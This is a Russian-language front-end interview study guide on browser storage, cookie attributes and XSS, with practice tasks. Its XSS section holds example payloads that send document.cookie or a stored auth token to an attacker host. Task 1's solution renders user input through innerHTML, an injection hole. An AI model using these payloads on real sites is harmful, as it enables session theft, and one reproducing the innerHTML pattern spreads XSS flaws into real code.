# Хранилища, Cookie, XSS

## Вопросы с собеседования

### 1. В чем разница между localStorage, sessionStorage и cookie?

```js
// ========== localStorage ==========
// - Хранится бессрочно, пока не удалить вручную
// - Объем: 5-10 MB
// - Доступен из любого JS на том же домене
// - Не отправляется на сервер автоматически
// - Используется для: настройки темы, кэш данных, долгосрочные предпочтения

// Сохранение:
localStorage.setItem("theme", "dark");
localStorage.setItem("user", JSON.stringify({ name: "Alice", age: 25 }));

// Получение:
const theme = localStorage.getItem("theme");
const user = JSON.parse(localStorage.getItem("user"));

// Удаление:
localStorage.removeItem("theme");
localStorage.clear(); // удалить всё

// ========== sessionStorage ==========
// - Живет до закрытия вкладки (при перезагрузке сохраняется)
// - Объем: ~5 MB
// - НЕ делится между вкладками
// - Используется для: временные данные формы, состояние вкладки

sessionStorage.setItem("formData", JSON.stringify({ name: "", email: "" }));

// ========== Cookies ==========
// - Живет: сессионная (до закрытия браузера) или persistent (expires/max-age)
// - Объем: ~4 KB на одну cookie
// - Автоматически отправляется с каждым HTTP-запросом
// - Используется для: авторизация (HttpOnly), сессии, трекинг

// Установка cookie:
document.cookie = "username=Alice; max-age=3600; path=/";
document.cookie = "theme=dark; expires=Wed, 01 Jan 2025 12:00:00 UTC; Secure; SameSite=Strict";

// Получение всех cookie:
console.log(document.cookie); // "username=Alice; theme=dark"
```

### 1.1 Время жизни

```js
// localStorage:
// - Бессрочно (пока пользователь не удалит вручную или через код)

// sessionStorage:
// - До закрытия вкладки (перезагрузка страницы НЕ удаляет)

// Cookies:
document.cookie = "session=123"; // Session cookie (удаляется при закрытии браузера)
document.cookie = "persistent=456; max-age=3600"; // Живет 1 час
document.cookie = "long=789; expires=Wed, 01 Jan 2026 00:00:00 UTC"; // Живет до указанной даты
```

### 1.2 Объем памяти

```js
// localStorage: 5-10 MB (зависит от браузера)
// sessionStorage: ~5 MB
// cookies: ~4 KB на одну cookie (обычно до 20 cookies на домен)

// Проверка объема localStorage:
let test = "";
try {
  for (let i = 0; i < 10 * 1024 * 1024; i++) {
    test += "a";
    localStorage.setItem("test", test);
  }
} catch (e) {
  console.log("Переполнение при размере:", test.length);
}
```

### 1.3 Настройки cookie

```js
// HttpOnly — запрещает доступ из JavaScript (защита от XSS)
// Set-Cookie: token=abc123; HttpOnly
// document.cookie не видит эту cookie

// Secure — отправляется только по HTTPS
// Set-Cookie: token=abc123; Secure

// SameSite — защита от CSRF
// SameSite=Strict   — только с того же сайта
// SameSite=Lax      — частично разрешает (для навигации)
// SameSite=None     — разрешает всё (требует Secure)

// expires / max-age — срок жизни
// domain — для какого домена работает
// path — для какого пути доступна

// Пример защищенной cookie:
document.cookie = "sessionToken=xyz; Secure; HttpOnly; SameSite=Strict; max-age=86400; path=/";
```

---

### 2. Что такое XSS атаки?

```js
// XSS (Cross-Site Scripting) — внедрение вредоносного JS-кода на страницу
// Код выполняется в браузере жертвы, может украсть данные, действовать от имени пользователя

// ========== Виды XSS ==========

// 1. Stored XSS (сохраняется в БД)
// Злоумышленник оставляет вредоносный код в комментарии/посте
// Он хранится на сервере и отображается всем пользователям

// 2. Reflected XSS (через URL)
// Вредоносный код в параметре URL
// Пример: https://example.com/search?q=<script>alert('XSS')</script>

// 3. DOM-based XSS (через JS на клиенте)
// Использует манипуляции с DOM
// Пример: element.innerHTML = userInput (где userInput содержит <script>)

// ========== Чем опасны innerHTML, eval(), dangerouslySetInnerHTML ==========

// 1. innerHTML:
const userComment = "<script>fetch('https://attacker.com?cookie=' + document.cookie)</script>";
element.innerHTML = userComment; // Код выполнится!

// Безопасная альтернатива:
element.textContent = userComment; // Экранирует HTML-теги

// 2. eval():
eval("alert('Привет')"); // Выполняет любой JS-код
const userInput = "fetch('https://attacker.com?cookie=' + document.cookie)";
eval(userInput); // ОГРОМНАЯ опасность!

// 3. dangerouslySetInnerHTML (React):
// <div dangerouslySetInnerHTML={{__html: userInput}} /> // Опасно!

// ========== Защита от XSS ==========
// 1. Экранировать/санитизировать пользовательский ввод
// 2. Использовать textContent вместо innerHTML
// 3. Использовать CSP (Content Security Policy) заголовки
// 4. HttpOnly cookie для токенов
```

---

### 3. Синхронизация между вкладками

```js
// Используем localStorage + событие storage

// Вкладка 1:
localStorage.setItem("message", "Привет из вкладки 1");

// Вкладка 2 (и 3, 4...):
window.addEventListener("storage", (event) => {
  console.log("Ключ:", event.key); // "message"
  console.log("Старое значение:", event.oldValue);
  console.log("Новое значение:", event.newValue); // "Привет из вкладки 1"
  console.log("URL:", event.url);
});

// Событие storage срабатывает ТОЛЬКО в ДРУГИХ вкладках
// (не в той, где произошло изменение)

// Практический пример: синхронизация темы
// Вкладка 1: переключаем тему
localStorage.setItem("theme", "dark");

// Вкладка 2: слушаем и применяем
window.addEventListener("storage", (e) => {
  if (e.key === "theme") {
    document.body.className = e.newValue;
  }
});
```

---

### 4. Почему нельзя хранить важную информацию в localStorage?

```js
// ========== Проблема: доступность из JS ==========
// Любой XSS-скрипт украдет данные:

// Вредоносный скрипт на странице:
const token = localStorage.getItem("authToken");
fetch("https://attacker.com/steal?token=" + token);

// ========== Сравнение с HttpOnly cookie ==========
// localStorage:
// - Доступен из любого JS
// - Нет защиты от XSS
// - Подходит только для НЕчувствительных данных

// HttpOnly cookie:
// - НЕ доступен из JS
// - Автоматически отправляется с запросами
// - Безопасен при XSS (скрипт не может украсть)
// - Нужен CSRF-токен для защиты

// ========== Что можно хранить в localStorage? ==========
// ✅ Тема оформления (dark/light)
// ✅ Настройки UI (размер шрифта, язык)
// ✅ Кэш нечувствительных данных
// ✅ Состояние формы (черновики)

// ❌ Access / Refresh токены
// ❌ Пароли
// ❌ Персональные данные
// ❌ Номера карт
// ❌ Любые конфиденциальные данные
```

---

### 5. Что такое IndexedDB?

```js
// IndexedDB — встроенная NoSQL база данных в браузере

// ========== Возможности ==========
// - Объем: большие данные (сотни MB, даже GB)
// - Асинхронная (не блокирует UI)
// - Хранит сложные типы: объекты, массивы, Blob, File
// - Индексы для быстрого поиска
// - Транзакции

// ========== Когда использовать? ==========
// - Оффлайн-режим (PWA)
// - Хранение больших данных (например, кэш видео)
// - Сложные запросы к данным
// - Экспорт/импорт данных

// ========== Простой пример ==========
const request = indexedDB.open("MyDatabase", 1);

request.onupgradeneeded = (event) => {
  const db = event.target.result;
  const store = db.createObjectStore("users", { keyPath: "id" });
  store.createIndex("name", "name", { unique: false });
};

request.onsuccess = (event) => {
  const db = event.target.result;

  // Запись
  const transaction = db.transaction(["users"], "readwrite");
  const store = transaction.objectStore("users");
  store.put({ id: 1, name: "Alice", age: 25 });

  // Чтение
  const getRequest = store.get(1);
  getRequest.onsuccess = () => {
    console.log(getRequest.result); // { id: 1, name: "Alice", age: 25 }
  };
};
```

---

## Практические задачи с решениями

### Задача 1. Список затрат с фильтрацией и сохранением

**HTML:**

```html
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <title>Список затрат</title>
    <style>
      .expense-item {
        display: flex;
        justify-content: space-between;
        padding: 8px;
        margin: 5px 0;
        background: #f0f0f0;
        border-radius: 4px;
      }
      .delete-btn {
        background: red;
        color: white;
        border: none;
        border-radius: 4px;
        cursor: pointer;
      }
    </style>
  </head>
  <body>
    <form id="expenseForm">
      <input type="text" id="expenseName" placeholder="Название траты" required />
      <input type="number" id="expenseAmount" placeholder="Сумма" required />
      <button type="submit">Добавить</button>
    </form>

    <input type="number" id="filterInput" placeholder="Показать до суммы..." />

    <ul id="expenseList"></ul>

    <script>
      let expenses = [];

      // Загрузка из localStorage
      function loadFromStorage() {
        const saved = localStorage.getItem("expenses");
        if (saved) expenses = JSON.parse(saved);

        const savedFilter = localStorage.getItem("filter");
        if (savedFilter) document.querySelector("#filterInput").value = savedFilter;

        renderList();
      }

      // Сохранение в localStorage
      function saveToStorage() {
        localStorage.setItem("expenses", JSON.stringify(expenses));
        localStorage.setItem("filter", document.querySelector("#filterInput").value);
      }

      // Отрисовка списка с учетом фильтра
      function renderList() {
        const filter = Number(document.querySelector("#filterInput").value) || Infinity;
        const filtered = expenses.filter((exp) => exp.amount <= filter);
        const list = document.querySelector("#expenseList");

        list.innerHTML = "";
        filtered.forEach((expense, index) => {
          const li = document.createElement("li");
          li.className = "expense-item";
          li.innerHTML = `
                    <span>${expense.name}</span>
                    <span>${expense.amount} ₽</span>
                    <button class="delete-btn" data-index="${index}">Удалить</button>
                `;
          list.appendChild(li);
        });

        // Добавляем обработчики удаления
        document.querySelectorAll(".delete-btn").forEach((btn) => {
          btn.addEventListener("click", (e) => {
            const idx = parseInt(btn.dataset.index);
            expenses.splice(idx, 1);
            saveToStorage();
            renderList();
          });
        });
      }

      // Добавление траты
      const form = document.querySelector("#expenseForm");
      form.addEventListener("submit", (e) => {
        e.preventDefault();
        const name = document.querySelector("#expenseName").value.trim();
        const amount = Number(document.querySelector("#expenseAmount").value);

        if (name && amount > 0) {
          expenses.push({ name, amount });
          saveToStorage();
          renderList();
          form.reset();
        }
      });

      // Фильтр
      const filterInput = document.querySelector("#filterInput");
      filterInput.addEventListener("input", () => {
        saveToStorage();
        renderList();
      });

      // Инициализация
      loadFromStorage();
    </script>
  </body>
</html>
```

---

### Задача 2. Форма входа с приветствием и сохранением авторизации

**HTML:**

```html
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <title>Авторизация</title>
    <style>
      .hidden {
        display: none;
      }
      .container {
        max-width: 400px;
        margin: 50px auto;
        text-align: center;
      }
      input,
      button {
        padding: 10px;
        margin: 5px;
      }
    </style>
  </head>
  <body>
    <div class="container">
      <form id="loginForm">
        <input type="text" id="username" placeholder="Имя пользователя" required />
        <button type="submit">Войти</button>
      </form>

      <div id="welcomeMessage" class="hidden">
        <h2>Привет, <span id="hello"></span>!</h2>
        <button id="logoutBtn">Выйти</button>
      </div>
    </div>

    <script>
      const loginForm = document.querySelector("#loginForm");
      const welcomeDiv = document.querySelector("#welcomeMessage");
      const helloSpan = document.querySelector("#hello");
      const logoutBtn = document.querySelector("#logoutBtn");

      // Проверяем авторизацию при загрузке
      function checkAuth() {
        const username = localStorage.getItem("username");
        if (username) {
          helloSpan.textContent = username;
          loginForm.classList.add("hidden");
          welcomeDiv.classList.remove("hidden");
        } else {
          loginForm.classList.remove("hidden");
          welcomeDiv.classList.add("hidden");
        }
      }

      // Вход
      loginForm.addEventListener("submit", (e) => {
        e.preventDefault();
        const username = document.querySelector("#username").value.trim();

        if (username) {
          localStorage.setItem("username", username);
          helloSpan.textContent = username;
          loginForm.classList.add("hidden");
          welcomeDiv.classList.remove("hidden");
        }
      });

      // Выход
      logoutBtn.addEventListener("click", () => {
        localStorage.removeItem("username");
        checkAuth();
        document.querySelector("#username").value = "";
      });

      checkAuth();
    </script>
  </body>
</html>
```

---

### Задача 3. Синхронизация состояния между вкладками

**HTML:**

```html
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <title>Синхронизация между вкладками</title>
    <style>
      body {
        font-family: Arial, sans-serif;
        padding: 20px;
      }
      input {
        padding: 10px;
        width: 300px;
        margin: 10px 0;
      }
    </style>
  </head>
  <body>
    <h2>Вкладка: <span id="tabId"></span></h2>
    <input type="text" id="sharedInput" placeholder="Пиши здесь..." />
    <p>Текущий текст: <strong id="currentValue"></strong></p>

    <script>
      const tabId = Date.now(); // уникальный ID для вкладки
      document.querySelector("#tabId").textContent = tabId;

      const input = document.querySelector("#sharedInput");
      const currentSpan = document.querySelector("#currentValue");

      // При загрузке читаем сохраненное значение
      const savedValue = localStorage.getItem("sharedText");
      if (savedValue) {
        input.value = savedValue;
        currentSpan.textContent = savedValue;
      }

      // Сохраняем при вводе
      input.addEventListener("input", () => {
        const value = input.value;
        localStorage.setItem("sharedText", value);
        currentSpan.textContent = value;
      });

      // Слушаем изменения в других вкладках
      window.addEventListener("storage", (event) => {
        if (event.key === "sharedText") {
          const newValue = event.newValue;
          input.value = newValue;
          currentSpan.textContent = newValue;
          console.log(`Вкладка ${tabId} получила новое значение:`, newValue);
        }
      });
    </script>
  </body>
</html>
```

---

## Шпаргалка по хранилищам

| Характеристика         | localStorage      | sessionStorage      | Cookies                   |
| ---------------------- | ----------------- | ------------------- | ------------------------- |
| Объем                  | 5-10 MB           | ~5 MB               | 4 KB                      |
| Время жизни            | Бессрочно         | До закрытия вкладки | Сессия / expires          |
| Отправляется на сервер | Нет               | Нет                 | Да (автоматически)        |
| Доступ из JS           | Да                | Да                  | Частично (кроме HttpOnly) |
| Между вкладками        | Да                | Нет                 | Да                        |
| Защита от XSS          | Нет               | Нет                 | HttpOnly                  |
| Использование          | Настройки UI, кэш | Временные данные    | Авторизация, сессии       |

---
